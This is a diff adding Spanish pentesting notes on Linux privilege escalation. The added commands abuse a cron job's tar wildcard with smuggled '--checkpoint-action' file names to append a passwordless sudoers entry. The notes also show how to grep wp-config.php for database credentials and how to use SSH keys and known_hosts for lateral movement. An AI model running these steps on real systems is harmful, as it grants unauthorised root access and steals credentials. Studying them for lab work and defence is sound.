@@ -248,3 +248,63 @@ grep -r terminoabuscar /ruta --text | grep -vE "jpg|Binary"
 
 ```
 
+## Abuse Wild cards
+
+Se puede ejecutar comandos y escalar privilegios con programas como tar que descomprimen
+
+Se ejecuta un trabajo cron cada minuto 
+```
+mh dom mon dow command
+*/01 * * * * cd /tmp && tar -zcf /tmp/backup.tar.gz *
+
+```
+
+Funciona de la siguiente manera
+
+```
+echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+```
+Entonces lo que sea haria seria que el cron ejecutaria con el wildcard nuestros archivos y tendriamos permiso de ejecutar comandos root sin tener el passwd
+
+## Searching for Creds
+
+Algunas extenciones que podrian contener credenciales son:
+
+>.conf, .config, .xml, etc., shell scripts, a user's bash history file, backup (.bak) files.
+
+
+### /var Directory
+
+> The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files.
+
+### WordPress 
+
+Por ejemplo en el caso de wordpress 
+
+```
+ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
+ 
+ ```
+ 
+ 
+ ### SSH Keys
+ 
+> We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges.
+ 
+> Whenever finding SSH keys check the known_hosts file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.
+  
+  
+ 
+
+
+
+
+
+
+
+
+
+
+
